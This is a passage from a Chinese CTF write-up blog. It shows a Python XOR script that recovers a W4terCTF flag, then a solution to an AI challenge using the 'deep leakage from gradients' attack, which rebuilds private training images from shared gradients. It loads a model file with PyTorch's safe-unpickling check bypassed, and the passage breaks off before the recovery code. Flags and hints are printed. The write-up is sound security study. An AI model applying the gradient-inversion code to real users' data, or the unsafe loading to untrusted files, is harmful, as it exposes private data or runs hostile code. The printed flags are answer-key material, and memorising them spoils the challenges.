class=\"number\">0x6C</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0xAA</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x70</span>, <span class=\"number\">0xB3</span>, <span class=\"number\">0xB3</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x9C</span>, <span class=\"number\">0xAF</span>, <span class=\"number\">0xBC</span>, <span class=\"number\">0x7E</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0xC8</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0xC5</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0xF4</span>, <span class=\"number\">0xA7</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>, <span class=\"number\">0xA4</span>, <span class=\"number\">0xD7</span>, <span class=\"number\">0x90</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span></span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">v11 = <span class=\"number\">20250428</span>  <span class=\"comment\">#传入的数值参数</span></span><br><span class=\"line\">v2 = <span class=\"number\">0</span></span><br><span class=\"line\">v3 = <span class=\"number\">5</span> * v11</span><br><span class=\"line\">v4 = <span class=\"number\">15</span> * v11</span><br><span class=\"line\">v5 = <span class=\"number\">20</span> * v11</span><br><span class=\"line\">v6 = <span class=\"number\">10</span> * v11</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = <span class=\"built_in\">bytearray</span>(target_bytes)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i + <span class=\"number\">15</span> + <span class=\"number\">4</span> &gt; <span class=\"built_in\">len</span>(s1): </span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">xor_dword</span>(<span class=\"params\">offset, value</span>):</span><br><span class=\"line\">        pos = i + offset</span><br><span class=\"line\">        val = struct.unpack_from(<span class=\"string\">&#x27;&lt;I&#x27;</span>, s1, pos)[<span class=\"number\">0</span>]  </span><br><span class=\"line\">        val ^= value</span><br><span class=\"line\">        struct.pack_into(<span class=\"string\">&#x27;&lt;I&#x27;</span>, s1, pos, val)</span><br><span class=\"line\"></span><br><span class=\"line\">    xor_dword(<span class=\"number\">0</span>, v2)</span><br><span class=\"line\">    xor_dword(<span class=\"number\">5</span>, v3 + v2)</span><br><span class=\"line\">    xor_dword(<span class=\"number\">10</span>, v6 + v2)</span><br><span class=\"line\">    xor_dword(<span class=\"number\">15</span>, v4 + v2)</span><br><span class=\"line\"></span><br><span class=\"line\">    v2 += v5</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;解密后的字节数据：\\n<span class=\"subst\">&#123;s1&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试以不同的编码解码</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    result = s1.rstrip(<span class=\"string\">b&#x27;\\x00&#x27;</span>).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 解密成功，flag/原文为：\\n<span class=\"subst\">&#123;result&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> UnicodeDecodeError:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 解密失败，UTF-8 解码出错。尝试其他编码方式。&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        result = s1.decode(<span class=\"string\">&#x27;latin1&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 使用 latin1 编码解密成功，flag/原文为：\\n<span class=\"subst\">&#123;result&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> UnicodeDecodeError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 解密失败，latin1 解码出错。&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></div>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504172338683.png\"\n                      alt=\"image-20250504172338683\"\n                ></p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;WHEN_yOUr_DReAMS_COME_AIivE_YoU&#x27;r3_Un5T0pp461E&#125;</span><br></pre></td></tr></table></figure></div>\n<h1 id=\"AI\"><a href=\"#AI\" class=\"headerlink\" title=\"AI\"></a>AI</h1><h2 id=\"Gradient\"><a href=\"#Gradient\" class=\"headerlink\" title=\"Gradient\"></a>Gradient</h2><p>AI题先交给AI做，后面一定好好上创新实践训练课😭😭😭</p>\n<p>特别感谢出题人R1ck，因为深度学习的知识尚浅薄，靠R1ck提点才有今天的成功，也算是给这次比赛画上一个圆满的句号了。</p>\n<p>根据题目，找到参考的论文以及源代码。</p>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 核心代码</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">deep_leakage_from_gradients</span>(<span class=\"params\">model, origin_grad</span>): </span><br><span class=\"line\">  dummy_data = torch.randn(origin_data.size())</span><br><span class=\"line\">  dummy_label =  torch.randn(dummy_label.size())</span><br><span class=\"line\">  optimizer = torch.optim.LBFGS([dummy_data, dummy_label] )</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> iters <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">300</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">closure</span>():</span><br><span class=\"line\">      optimizer.zero_grad()</span><br><span class=\"line\">      dummy_pred = model(dummy_data) </span><br><span class=\"line\">      dummy_loss = criterion(dummy_pred, F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)) </span><br><span class=\"line\">      dummy_grad = grad(dummy_loss, model.parameters(), create_graph=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">      grad_diff = <span class=\"built_in\">sum</span>(((dummy_grad - origin_grad) ** <span class=\"number\">2</span>).<span class=\"built_in\">sum</span>() \\</span><br><span class=\"line\">        <span class=\"keyword\">for</span> dummy_g, origin_g <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(dummy_grad, origin_grad))</span><br><span class=\"line\">      </span><br><span class=\"line\">      grad_diff.backward()</span><br><span class=\"line\">      <span class=\"keyword\">return</span> grad_diff</span><br><span class=\"line\">    </span><br><span class=\"line\">    optimizer.step(closure)</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">return</span>  dummy_data, dummy_label</span><br></pre></td></tr></table></figure></div>\n<p>恢复的方法大意是指：</p>\n<ul>\n<li>先随机初始化一个虚假的原始图像dummy_data和原始标签dummy_label</li>\n<li>用LBFGS优化器来优化dummy_data和dummy_label，让他们产生的梯度和原始的梯度越来越接近</li>\n<li>然后对dummy_data在神经网络上前向传播，用dummy_label作为目标衡量损失 loss</li>\n<li>计算dummy_data的梯度</li>\n<li>衡量dummy_grad和origin_grad的差异，然后对dummy_data和dummy_label反向传播来优化。</li>\n<li>最后返回输出和标签，还原原始样本。</li>\n</ul>\n<p>现有的文件是 model.pth 和一些 梯度文件 .grad</p>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"comment\"># 占位模型类，用于加载（结构未知时也能绕过）</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">R1ckNet</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加入到 safe_globals（新 PyTorch 安全机制）</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.serialization <span class=\"keyword\">import</span> add_safe_globals</span><br><span class=\"line\">add_safe_globals(&#123;<span class=\"string\">&#x27;R1ckNet&#x27;</span>: R1ckNet&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">pthfile = <span class=\"string\">r&#x27;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth&#x27;</span>            <span class=\"comment\">#.pth文件的路径</span></span><br><span class=\"line\">model = torch.load(pthfile, map_location=<span class=\"string\">&#x27;cpu&#x27;</span>, weights_only=<span class=\"literal\">False</span>)</span><br><span class=\"line\">state_dict = model.state_dict()   <span class=\"comment\"># 从模型对象中提取参数字典</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> state_dict.items():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(k, v.shape)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果直接使用 torch.load 打印模型信息的话，会因为未知R1ckNet报错。</span></span><br><span class=\"line\"><span class=\"comment\">#所以实例化一个类占位。</span></span><br></pre></td></tr></table></figure></div>\n<p>通过torch.load打印模型信息，输出了每个卷积层的权重以及全连接层的权重。</p>\n<ul>\n<li>卷积层权重：卷积核数量、输入通道数、卷积核大小。</li>\n<li>全连接层权重：输入与输出之间的连接。</li>\n</ul>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 输出如下</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">body.0.weight torch.Size([12, 3, 5, 5])</span></span><br><span class=\"line\"><span class=\"string\">body.0.bias torch.Size([12])</span></span><br><span class=\"line\"><span class=\"string\">body.2.weight torch.Size([12, 12, 5, 5])</span></span><br><span class=\"line\"><span class=\"string\">body.2.bias torch.Size([12])</span></span><br><span class=\"line\"><span class=\"string\">body.4.weight torch.Size([12, 12, 5, 5])</span></span><br><span class=\"line\"><span class=\"string\">body.4.bias torch.Size([12])</span></span><br><span class=\"line\"><span class=\"string\">body.6.weight torch.Size([16, 12, 3, 3])</span></span><br><span class=\"line\"><span class=\"string\">body.6.bias torch.Size([16])</span></span><br><span class=\"line\"><span class=\"string\">fc.0.weight torch.Size([100, 1024])</span></span><br><span class=\"line\"><span class=\"string\">fc.0.bias torch.Size([100])</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>\n<p>拷打出题人后，发现对 .pth 文件挖掘不充分，进一步打印自定义类的超参数，得到一个hint</p>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">import</span> inspect</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果你的模型类定义在某个模块里，请确保能 import 到它</span></span><br><span class=\"line\"><span class=\"comment\"># 这里给出一个占位定义，实际加载时会使用 pickle 里的类定义</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">R1ckNet</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, in_channels=<span class=\"number\">3</span>, conv1_out=<span class=\"number\">12</span>, conv2_out=<span class=\"number\">12</span>, conv3_out=<span class=\"number\">12</span>, conv4_out=<span class=\"number\">16</span>, fc_in=<span class=\"number\">1024</span>, num_classes=<span class=\"number\">100</span></span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        <span class=\"comment\"># 如果模型里定义了 hparams，它会在实例上</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.hparams = &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;in_channels&quot;</span>: in_channels,</span><br><span class=\"line\">                <span class=\"string\">&quot;conv1_out&quot;</span>: conv1_out,</span><br><span class=\"line\">                <span class=\"string\">&quot;conv2_out&quot;</span>: conv2_out,</span><br><span class=\"line\">                <span class=\"string\">&quot;conv3_out&quot;</span>: conv3_out,</span><br><span class=\"line\">                <span class=\"string\">&quot;conv4_out&quot;</span>: conv4_out,</span><br><span class=\"line\">                <span class=\"string\">&quot;fc_in&quot;</span>: fc_in,</span><br><span class=\"line\">                <span class=\"string\">&quot;num_classes&quot;</span>: num_classes,</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"comment\"># 构建网络结构（可省略，仅为完整定义）</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.body = nn.Sequential(</span><br><span class=\"line\">            nn.Conv2d(in_channels, conv1_out, <span class=\"number\">5</span>, stride=<span class=\"number\">2</span>, padding=<span class=\"number\">2</span>), nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv1_out, conv2_out, <span class=\"number\">5</span>, stride=<span class=\"number\">2</span>, padding=<span class=\"number\">2</span>), nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv2_out, conv3_out, <span class=\"number\">5</span>, stride=<span class=\"number\">1</span>, padding=<span class=\"number\">2</span>), nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv3_out, conv4_out, <span class=\"number\">3</span>, stride=<span class=\"number\">1</span>, padding=<span class=\"number\">1</span>), nn.Sigmoid(),</span><br><span class=\"line\">            nn.Flatten()</span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.fc = nn.Linear(fc_in, num_classes)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.body(x)</span><br><span class=\"line\">        x = x.view(x.size(<span class=\"number\">0</span>), -<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span>.fc(x)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__repr__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 尝试打印 hparams，否则退回默认</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(<span class=\"variable language_\">self</span>, <span class=\"string\">&#x27;hparams&#x27;</span>):</span><br><span class=\"line\">            params = <span class=\"string\">&quot;, &quot;</span>.join(<span class=\"string\">f&quot;<span class=\"subst\">&#123;k&#125;</span>=<span class=\"subst\">&#123;v&#125;</span>&quot;</span> <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.hparams.items())</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">f&quot;<span class=\"subst\">&#123;self.__class__.__name__&#125;</span>(<span class=\"subst\">&#123;params&#125;</span>)&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>().__repr__()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    parser = argparse.ArgumentParser()</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--pth&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>, required=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                        <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;path to .pth file (whole-model or state_dict)&#x27;</span>)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 载入 .pth</span></span><br><span class=\"line\">    loaded = torch.load(args.pth, map_location=<span class=\"string\">&#x27;cpu&#x27;</span>,weights_only=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 判定类型</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(loaded, <span class=\"built_in\">dict</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Detected state_dict. Instantiating R1ckNet and loading state_dict.&quot;</span>)</span><br><span class=\"line\">        model = R1ckNet()</span><br><span class=\"line\">        <span class=\"comment\"># 支持 checkpoint dict 包含 &#x27;model_state_dict&#x27;</span></span><br><span class=\"line\">        sd = loaded.get(<span class=\"string\">&#x27;model_state_dict&#x27;</span>, loaded)</span><br><span class=\"line\">        model.load_state_dict(sd)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Detected full-model object. Using it directly.&quot;</span>)</span><br><span class=\"line\">        model = loaded</span><br><span class=\"line\"></span><br><span class=\"line\">    model.<span class=\"built_in\">eval</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 1) 打印 repr（调用 __repr__）</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Model repr() ===&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(model)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 2) 打印构造函数签名</span></span><br><span class=\"line\">    sig = inspect.signature(model.__class__.__init__)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Constructor signature ===&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(sig)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 3) 如果有 hparams</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(model, <span class=\"string\">&#x27;hparams&#x27;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== model.hparams ===&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> model.hparams.items():</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;  <span class=\"subst\">&#123;k&#125;</span> = <span class=\"subst\">&#123;v&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nNo model.hparams attribute. Inspecting instance __dict__ for hyperparam-like entries...&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> <span class=\"built_in\">vars</span>(model).items():</span><br><span class=\"line\">            <span class=\"comment\"># 过滤模块和参数</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(v, (nn.Module, nn.Parameter)) <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> k.startswith(<span class=\"string\">&#x27;_&#x27;</span>):</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;  <span class=\"subst\">&#123;k&#125;</span> = <span class=\"subst\">&#123;v&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 4) 列出所有参数名和形状</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== model.named_parameters() ===&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> name, param <span class=\"keyword\">in</span> model.named_parameters():</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;name:30s&#125;</span> | shape: <span class=\"subst\">&#123;<span class=\"built_in\">tuple</span>(param.shape)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\"># cmd line: python info.py --pth &quot;your.pth&quot;</span></span><br></pre></td></tr></table></figure></div>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504203337339.png\"\n                      alt=\"image-20250504203337339\"\n                ></p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint: 7h3_84ck6r0und_0f_7h3_ch4r4c73r_1m463_15_wh173😝</span><br><span class=\"line\">字符背景是白色的。</span><br></pre></td></tr></table></figure></div>\n<p>那么结合上述的神经网络的信息，就能导入梯度迭代恢复了。</p>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td 